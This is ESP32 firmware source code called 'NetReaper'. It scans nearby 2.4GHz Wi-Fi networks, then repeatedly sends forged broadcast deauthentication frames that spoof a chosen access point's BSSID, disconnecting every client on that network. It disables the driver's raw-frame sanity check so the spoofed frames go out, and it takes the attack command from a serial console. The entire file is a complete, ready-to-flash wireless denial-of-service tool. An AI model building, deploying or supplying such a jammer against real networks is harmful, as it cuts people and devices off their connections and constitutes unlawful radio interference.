/*
 * NetReaper
 * A tool that deauth 2.4GHz Wi-Fi networks via ESP32 on serial console.
 * Author - WireBits
 */

#include <WiFi.h>
#include <stdint.h>
#include "esp_wifi.h"

struct WiFiNetwork {
  String ssid;
  uint8_t bssid[6];
  int channel;
  int rssi;
};

const uint8_t deauthPacket[26] = {
  0xc0, 0x00, 0x3a, 0x01,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x07, 0x00
};

int networkCount = 0;
int targetChannel = 1;
bool scanning = false;
uint8_t targetBSSID[6];
bool scanExecuted = false;
bool deauthRunning = false;
bool deauthExecuted = false;
WiFiNetwork scannedNetworks[20];

extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    return 0;
}

void startWiFiScan() {
  Serial.println("[*] Scanning for networks...");
  scanning = true;
  scanExecuted = true;
  WiFi.scanNetworks(true);
}

void showScannedNetworks() {
  networkCount = WiFi.scanComplete();
  if (networkCount == 0) {
    Serial.println("[!] No networks found!");
    return;
  }
  Serial.println("\n[*] Scanned WiFi Networks:");
  Serial.println("-------------------------------------------------");
  for (int i = 0; i < networkCount; i++) {
    scannedNetworks[i].ssid = WiFi.SSID(i);
    memcpy(scannedNetworks[i].bssid, WiFi.BSSID(i), 6);
    scannedNetworks[i].channel = WiFi.channel(i);
    scannedNetworks[i].rssi = WiFi.RSSI(i);
    Serial.printf("[%02d] - SSID    : %s\n", i, scannedNetworks[i].ssid.c_str());
    Serial.printf("       BSSID   : %02X:%02X:%02X:%02X:%02X:%02X\n",
                      scannedNetworks[i].bssid[0], scannedNetworks[i].bssid[1], 
                      scannedNetworks[i].bssid[2], scannedNetworks[i].bssid[3], 
                      scannedNetworks[i].bssid[4], scannedNetworks[i].bssid[5]);
    Serial.printf("       Channel : %d\n", scannedNetworks[i].channel);
    Serial.printf("       RSSI    : %d dBm\n", scannedNetworks[i].rssi);
    Serial.println("-------------------------------------------------");
  }
}

void initDeauth() {
  deauthRunning = false;
  deauthExecuted = false;
}

void startDeauth(int index) {
  if (index < 0 || index >= networkCount) {
    Serial.println("[!] Invalid index!");
    return;
  }
  memcpy(targetBSSID, scannedNetworks[index].bssid, 6);
  targetChannel = scannedNetworks[index].channel;
  esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
  Serial.printf("[*] Deauth Attack Started on %s (Channel: %d)\n", scannedNetworks[index].ssid.c_str(), targetChannel);
  digitalWrite(2, HIGH);
  esp_wifi_set_promiscuous(true);
  deauthRunning = true;
  deauthExecuted = true;
}

void sendDeauth() {
  uint8_t packet[26];
  memcpy(packet, deauthPacket, 26);
  memcpy(&packet[10], targetBSSID, 6);
  memcpy(&packet[16], targetBSSID, 6);
  esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
}

void stopDeauth() {
  deauthRunning = false;
  WiFi.mode(WIFI_STA);
  digitalWrite(2, LOW);
  Serial.println("[*] Deauth Attack Stopped!");
}

void showHelp() {
  Serial.println("\nAvailable Commands:");
  Serial.println("  scan        - Scan for nearby WiFi networks");
  Serial.println("  deauth X    - Start deauth attack on network X (X = Index Number)");
  Serial.println("  deauth off  - Stop deauth attack");
  Serial.println("  help        - Show this help message");
}

void handleSerial() {
  if (Serial.available()) {
    String command = Serial.readStringUntil('\n');
    command.trim();
    if (command.equalsIgnoreCase("scan")) {
      startWiFiScan();
    }
    else if (command.startsWith("deauth ")) {
      String arg = command.substring(7);
      arg.trim();
      if (arg.equalsIgnoreCase("off")) {
        if (!deauthExecuted) {
          Serial.println("[!] Deauth Network First!");
        } else {
          stopDeauth();
        }
      } else {
        int index = arg.toInt();
        startDeauth(index);
      }
    }
    else if (command.equalsIgnoreCase("help")) {
      showHelp();
    }
    else {
      Serial.println("[!] Invalid command. Type 'help' for available commands!");
    }
  }
}

void setup() {
  Serial.begin(115200);
  pinMode(2, OUTPUT);
  WiFi.mode(WIFI_STA);
  initDeauth();
  delay(500);
  Serial.print("+┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈+\n");
  Serial.print("|     ╔╗╔╔═╗╔╦╗╦═╗╔═╗╔═╗╔═╗╔═╗╦═╗    |\n");
  Serial.print("|     ║║║║╣  ║ ╠╦╝║╣ ╠═╣╠═╝║╣ ╠╦╝    |\n");
  Serial.print("|     ╝╚╝╚═╝ ╩ ╩╚═╚═╝╩ ╩╩  ╚═╝╩╚═    |\n");
  Serial.print("+┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈+\n");
  Serial.print("| 2.4GHz ESP32 Deauthentication Tool |\n");
  Serial.print("+┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈+\n");
  Serial.print("|         Author - WireBits          |\n");
  Serial.print("+┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈+\n");
  Serial.print("| Type 'help' for available commands |\n");
  Serial.print("+┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈+\n");
}

void loop() {
  handleSerial();
  if (scanning) {
    int found = WiFi.scanComplete();
    if (found >= 0) {
      showScannedNetworks();
      scanning = false;
      Serial.println("[*] Scanning Completed!");
    }
  }
  if (deauthRunning) {
    sendDeauth();
    delay(100);
  }
}
